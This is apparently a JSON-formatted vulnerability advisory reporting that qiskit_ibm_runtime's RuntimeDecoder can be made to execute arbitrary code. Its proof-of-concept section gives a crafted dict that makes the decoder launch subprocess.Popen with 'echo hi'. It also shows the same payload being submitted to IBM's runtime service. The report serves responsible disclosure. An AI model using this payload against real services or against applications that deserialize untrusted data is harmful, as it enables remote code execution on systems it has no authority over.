  "summary": "`qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code",
  "details": "### Summary\n\ndeserializing json data using `qiskit_ibm_runtime.RuntimeDecoder` can be made to execute arbitrary code given a correctly formatted input string\n\n### Details\n\n`RuntimeDecoder` is supposed to be able to deserialize JSON strings containing various special types encoded via `RuntimeEncoder`. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159\n\n### PoC\n\n```python\nmalicious_data = {\n    \"__type__\": \"settings\",\n    \"__module__\": \"subprocess\",\n    \"__class__\": \"Popen\",\n    \"__value__\": {\n        \"args\": [\"echo\", \"hi\"]\n    },\n}\njson_str = json.dumps(malicious_data)\n\n_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints \"hi\" to the terminal\n```\n(where obviously \"echo hi\" can be replaced with something much more malicious)\n\nnotably the following also makes it through the runtime API, with `malicious_data` serialized client-side via `RuntimeEncoder` (and therefore presumably deserialized server-side via `RuntimeDecoder`?)\n```python\nservice = qiskit_ibm_runtime(\u003cibm_cloud_credentials\u003e)\njob = service.run(\"qasm3-runner\", malicious_data)\nprint(job.status())  # prints \"JobStatus.QUEUED\"\n```\n\n### Impact\n\ni don't know if `qiskit_ibm_runtime.RuntimeDecoder` is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)",
